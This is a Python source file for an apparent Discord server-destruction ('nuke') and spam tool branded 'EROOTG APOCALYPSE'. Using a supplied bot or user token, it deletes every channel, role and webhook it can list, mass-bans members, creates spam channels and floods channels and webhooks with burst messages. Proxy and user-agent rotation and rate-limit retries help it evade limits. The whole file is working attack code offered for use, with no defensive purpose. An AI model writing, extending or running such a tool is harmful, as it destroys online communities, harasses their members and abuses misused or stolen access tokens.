import os
import sys
import time
import json
import random
import threading
import asyncio
import aiohttp
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from pystyle import Colors, Colorate

clear = lambda: os.system('cls' if os.name == 'nt' else 'clear')

# ======================== BANNER ========================
logo = """
 ╔═════ ╔═════╗ ╔═════╗ ╔═════╗ ╔═════╗ ╔═════╗
 ║ ╔═══ ║  _  ║ ║  _  ║ ║  _  ║   ║     ║ ╔═══╝
 ║ ╚══╗ ║ █ █ ║ ║ ║ ║ ║ ║ ║ ║ ║   ║     ║ ║  _ 
 ║ ╔══╝ ║ █ █ ║ ║ ║ ║ ║ ║ ║ ║ ║   ║     ║ ║ █ ║
 ║ ╚═══ ║ █ █ ║ ║ █ █ ║ ║ █ █ ║   ║     ║ ╚══ ║
 ╚═════ ╚═════╝ ╚═════╝ ╚═════╝   ╚═╝   ╚═════╝
            EROOTG APOCALYPSE v5.1
       [ BURST EDITION - NO MERCY ]
"""

# ======================== CẤU HÌNH ========================
PROXY_LIST = []
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
]

stop_flag = False
results = {
    "total_sent": 0,
    "webhook_spam": 0,
    "channels_deleted": 0,
    "roles_deleted": 0,
    "members_banned": 0
}

# ======================== UI HELPERS ========================
def banner():
    clear()
    print(Colorate.Horizontal(Colors.red_to_purple, logo, 1))
    print(Colorate.Horizontal(Colors.cyan_to_blue, "="*70, 1))
    print()

def get_input(prompt, default=None):
    text = input(Colorate.Color(Colors.cyan, f"[>] {prompt}: ", 1) + Colorate.Color(Colors.white, "", 1)).strip()
    return text if text else default

def get_int(prompt, default=0):
    try:
        return int(get_input(prompt, str(default)))
    except:
        return default

def get_float(prompt, default=0.0):
    try:
        return float(get_input(prompt, str(default)))
    except:
        return default

def confirm(prompt="[!] Confirm? (yes/no): "):
    return input(Colorate.Color(Colors.red, prompt, 1) + Colorate.Color(Colors.white, "", 1)).strip().lower() == "yes"

def wait_for_stop():
    global stop_flag
    input()
    stop_flag = True
    print(Colorate.Color(Colors.yellow, "\n[!] Stop signal received. Finishing...", 1))

# ======================== REQUEST WRAPPER ========================
def req(method, url, token=None, json_data=None, retry=5):
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    if token:
        headers["Authorization"] = token
    if json_data:
        headers["Content-Type"] = "application/json"
    
    proxies = random.choice(PROXY_LIST) if PROXY_LIST else None
    if proxies:
        proxies = {"http": proxies, "https": proxies}
    
    for attempt in range(retry):
        try:
            r = requests.request(method, url, headers=headers, json=json_data, proxies=proxies, timeout=30)
            if r.status_code == 429:
                wait = r.json().get("retry_after", 2)
                time.sleep(wait + 0.5)
                continue
            return r
        except:
            time.sleep(1)
    return None

# ======================== DISCORD API HELPERS ========================
def get_channels(gid, token):
    r = req("GET", f"https://discord.com/api/v10/guilds/{gid}/channels", token)
    if r and r.status_code == 200:
        return [c for c in r.json() if c["type"] in [0, 2, 5]]
    return []

def get_roles(gid, token):
    r = req("GET", f"https://discord.com/api/v10/guilds/{gid}/roles", token)
    if r and r.status_code == 200:
        return [role["id"] for role in r.json() if role["id"] != gid]
    return []

def get_members(gid, token):
    r = req("GET", f"https://discord.com/api/v10/guilds/{gid}/members?limit=1000", token)
    if r and r.status_code == 200:
        return [m["user"]["id"] for m in r.json()]
    return []

def get_webhooks(gid, token):
    r = req("GET", f"https://discord.com/api/v10/guilds/{gid}/webhooks", token)
    if r and r.status_code == 200:
        return [w["id"] for w in r.json()]
    return []

def delete_channel(cid, token):
    r = req("DELETE", f"https://discord.com/api/v10/channels/{cid}", token)
    return r and r.status_code in [200, 204]

def delete_role(rid, gid, token):
    r = req("DELETE", f"https://discord.com/api/v10/guilds/{gid}/roles/{rid}", token)
    return r and r.status_code in [200, 204]

def ban_member(mid, gid, token):
    r = req("PUT", f"https://discord.com/api/v10/guilds/{gid}/bans/{mid}", token)
    return r and r.status_code in [200, 204]

def delete_webhook(wid, token):
    r = req("DELETE", f"https://discord.com/api/v10/webhooks/{wid}", token)
    return r and r.status_code in [200, 204]

def create_channel(gid, token, name):
    r = req("POST", f"https://discord.com/api/v10/guilds/{gid}/channels", token, {"name": name, "type": 0})
    return r and r.status_code == 201

def send_message(cid, token, msg):
    r = req("POST", f"https://discord.com/api/v10/channels/{cid}/messages", token, {"content": msg})
    return r and r.status_code == 200

def send_webhook(url, msg):
    try:
        r = requests.post(url, json={"content": msg}, timeout=10)
        return r.status_code == 204
    except:
        return False

# ======================== NUKE ENGINE ========================
def nuke_server(gid, token, webhook_url, threads=50):
    global stop_flag, results
    stop_flag = False
    threading.Thread(target=wait_for_stop, daemon=True).start()
    
    print(Colorate.Color(Colors.red, "\n[!] APOCALYPSE NUKE STARTING", 1))
    print(Colorate.Color(Colors.yellow, "[>] Press ENTER to stop", 1))
    
    # Validate token
    r = req("GET", "https://discord.com/api/v10/users/@me", token)
    if not r or r.status_code != 200:
        print(Colorate.Color(Colors.red, "[-] Invalid token!", 1))
        return
    
    user = r.json()
    print(Colorate.Color(Colors.green, f"[+] Token valid: {user.get('username', 'Unknown')}", 1))
    
    # 1. Delete Channels
    if not stop_flag:
        chans = get_channels(gid, token)
        if chans:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                results["channels_deleted"] = sum(1 for f in ex.map(lambda c: delete_channel(c["id"], token), chans) if f)
            print(Colorate.Color(Colors.green, f"[+] Deleted {results['channels_deleted']}/{len(chans)} channels", 1))
    
    # 2. Delete Roles
    if not stop_flag:
        roles = get_roles(gid, token)
        if roles:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                results["roles_deleted"] = sum(1 for f in ex.map(lambda r: delete_role(r, gid, token), roles) if f)
            print(Colorate.Color(Colors.green, f"[+] Deleted {results['roles_deleted']}/{len(roles)} roles", 1))
    
    # 3. Ban Members
    if not stop_flag:
        members = get_members(gid, token)
        if members:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                results["members_banned"] = sum(1 for f in ex.map(lambda m: ban_member(m, gid, token), members) if f)
            print(Colorate.Color(Colors.green, f"[+] Banned {results['members_banned']}/{len(members)} members", 1))
    
    # 4. Delete Webhooks
    if not stop_flag:
        whs = get_webhooks(gid, token)
        if whs:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                done = sum(1 for f in ex.map(lambda w: delete_webhook(w, token), whs) if f)
            print(Colorate.Color(Colors.green, f"[+] Deleted {done}/{len(whs)} webhooks", 1))
    
    # 5. Webhook Spam
    if webhook_url and not stop_flag:
        print(Colorate.Color(Colors.yellow, "[>] Webhook spam starting...", 1))
        with ThreadPoolExecutor(max_workers=20) as ex:
            futures = [ex.submit(send_webhook, webhook_url, "EROOTG APOCALYPSE") for _ in range(500)]
            results["webhook_spam"] = sum(1 for f in as_completed(futures) if f.result())
        print(Colorate.Color(Colors.green, f"[+] Webhook spam: {results['webhook_spam']}/500", 1))
    
    # 6. Create Spam Channels
    if not stop_flag:
        with ThreadPoolExecutor(max_workers=threads) as ex:
            done = sum(1 for f in ex.map(lambda i: create_channel(gid, token, f"erootg-apocalypse-{i}"), range(50)) if f)
        print(Colorate.Color(Colors.green, f"[+] Created {done} spam channels", 1))
    
    # 7. Spam Messages (BURST)
    if not stop_flag:
        chans = get_channels(gid, token)
        if chans:
            print(Colorate.Color(Colors.yellow, "[>] Spamming channels (BURST MODE)...", 1))
            total_messages = 500
            asyncio.run(spam_engine_async(gid, token, "EROOTG APOCALYPSE", total_messages, threads))
    
    print(Colorate.Color(Colors.red, "\n[+] APOCALYPSE NUKE COMPLETE", 1))
    print(Colorate.Color(Colors.white, f"    Channels Deleted: {results['channels_deleted']}", 1))
    print(Colorate.Color(Colors.white, f"    Roles Deleted: {results['roles_deleted']}", 1))
    print(Colorate.Color(Colors.white, f"    Members Banned: {results['members_banned']}", 1))
    print(Colorate.Color(Colors.white, f"    Webhook Spam: {results['webhook_spam']}", 1))
    print(Colorate.Color(Colors.white, f"    Messages Sent: {results['total_sent']}", 1))

# ======================== SPAM ENGINE - BURST (ASYNC) ========================
async def spam_engine_async(gid, token, msg, total_messages, threads=50):
    global stop_flag, results
    stop_flag = False
    
    chans = get_channels(gid, token)
    if not chans:
        print(Colorate.Color(Colors.red, "[-] No channels found!", 1))
        return

    print(Colorate.Color(Colors.green, f"[+] Found {len(chans)} channels", 1))
    print(Colorate.Color(Colors.yellow, "[>] Press ENTER to stop", 1))
    print(Colorate.Color(Colors.yellow, "[>] Spamming in BURST MODE (no delay)...", 1))

    # Chia đều số tin cho các channel
    messages_per_channel = total_messages // len(chans)
    if messages_per_channel == 0:
        messages_per_channel = 1

    async def spam_single_channel(cid, cname):
        """Spam 1 channel bằng async, bắn burst không đợi"""
        sent = 0
        async with aiohttp.ClientSession() as session:
            tasks = []
            for i in range(messages_per_channel):
                if stop_flag:
                    break
                task = asyncio.create_task(
                    send_message_async_raw(session, cid, token, msg)
                )
                tasks.append(task)
                sent += 1
                # Bắn burst 50 tin cùng lúc
                if len(tasks) >= 50:
                    await asyncio.gather(*tasks, return_exceptions=True)
                    tasks = []
            # Gửi nốt số tin còn lại
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
        return sent

    # Spam tất cả các channel song song
    tasks = [spam_single_channel(c["id"], c.get("name", "unknown")) for c in chans]
    results_per_channel = await asyncio.gather(*tasks, return_exceptions=True)
    
    total_sent = sum([r for r in results_per_channel if isinstance(r, int)])
    results["total_sent"] = total_sent
    print(Colorate.Color(Colors.green, f"\n[+] Done. Sent {total_sent} messages", 1))

async def send_message_async_raw(session, cid, token, msg):
    """Gửi tin nhắn async, không xử lý phản hồi để tăng tốc"""
    url = f"https://discord.com/api/v10/channels/{cid}/messages"
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": random.choice(USER_AGENTS)
    }
    try:
        async with session.post(url, headers=headers, json={"content": msg}) as resp:
            return resp.status
    except:
        return 0

def spam_engine(gid, token, msg, count, delay, threads=50):
    """Hàm wrapper để gọi async engine (delay không dùng)"""
    asyncio.run(spam_engine_async(gid, token, msg, count, threads))

# ======================== WEBHOOK SPAM ========================
def webhook_spam(url, msg, count, delay, threads=50):
    global stop_flag, results
    stop_flag = False
    threading.Thread(target=wait_for_stop, daemon=True).start()
    
    print(Colorate.Color(Colors.yellow, "[>] Webhook spam starting...", 1))
    sent = 0
    
    def worker(i):
        return send_webhook(url, msg)
    
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = [ex.submit(worker, i) for i in range(count)]
        for f in as_completed(futures):
            if stop_flag:
                break
            if f.result():
                sent += 1
                results["webhook_spam"] = sent
                if sent % 10 == 0:
                    print(Colorate.Color(Colors.green, f"[+] Webhook spam: {sent}/{count}", 1))
            if delay > 0:
                time.sleep(delay)
    
    print(Colorate.Color(Colors.green, f"\n[+] Webhook spam complete: {sent}/{count}", 1))

# ======================== MAIN ========================
def main():
    while True:
        banner()
        print(Colorate.Color(Colors.cyan, "╔════════════════════════════════════════╗", 1))
        print(Colorate.Color(Colors.cyan, "║  APOCALYPSE v5.1 - BURST EDITION       ║", 1))
        print(Colorate.Color(Colors.cyan, "╚════════════════════════════════════════╝", 1))
        print(Colorate.Color(Colors.yellow, "[1] NUKE SERVER (Full Apocalypse)", 1))
        print(Colorate.Color(Colors.yellow, "[2] SPAM CHANNELS (BURST MODE)", 1))
        print(Colorate.Color(Colors.yellow, "[3] WEBHOOK SPAM (Mass Webhook)", 1))
        print(Colorate.Color(Colors.yellow, "[4] DELETE WEBHOOK", 1))
        print(Colorate.Color(Colors.yellow, "[5] EXIT", 1))
        
        choice = get_input("Choose", "1")
        
        if choice == "1":
            banner()
            token = get_input("Discord Token (Bot/User)")
            if not token: continue
            gid = get_input("Server ID")
            if not gid: continue
            webhook = get_input("Webhook URL (optional)", "")
            threads = get_int("Threads (default 50)", 50)
            if confirm("NUKE THIS SERVER? (yes/no): "):
                nuke_server(gid, token, webhook if webhook else None, threads)
            input("\n[>] Press ENTER to continue...")
            
        elif choice == "2":
            banner()
            token = get_input("Discord Token")
            if not token: continue
            gid = get_input("Server ID")
            if not gid: continue
            msg = get_input("Spam Message", "EROOTG APOCALYPSE")
            count = get_int("Number of messages", 100)
            delay = get_float("Delay (seconds)", 0.1)  # Không dùng nữa, giữ cho tương thích
            threads = get_int("Threads (default 50)", 50)
            if confirm("SPAM THIS SERVER? (yes/no): "):
                spam_engine(gid, token, msg, count, delay, threads)
            input("\n[>] Press ENTER to continue...")
            
        elif choice == "3":
            banner()
            url = get_input("Webhook URL")
            if not url: continue
            msg = get_input("Spam Message", "EROOTG APOCALYPSE")
            count = get_int("Number of messages", 500)
            delay = get_float("Delay (seconds)", 0.05)
            threads = get_int("Threads (default 50)", 50)
            if confirm("SPAM THIS WEBHOOK? (yes/no): "):
                webhook_spam(url, msg, count, delay, threads)
            input("\n[>] Press ENTER to continue...")
            
        elif choice == "4":
            banner()
            url = get_input("Webhook URL")
            if not url: continue
            if confirm("DELETE THIS WEBHOOK? (yes/no): "):
                r = requests.delete(url)
                if r.status_code == 204:
                    print(Colorate.Color(Colors.green, "[+] Webhook deleted", 1))
                else:
                    print(Colorate.Color(Colors.red, f"[-] Failed (status: {r.status_code})", 1))
            input("\n[>] Press ENTER to continue...")
            
        elif choice == "5":
            print(Colorate.Color(Colors.yellow, "\n[!] EROOTG OUT.", 1))
            break

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Colorate.Color(Colors.yellow, "\n[!] Interrupted.", 1))
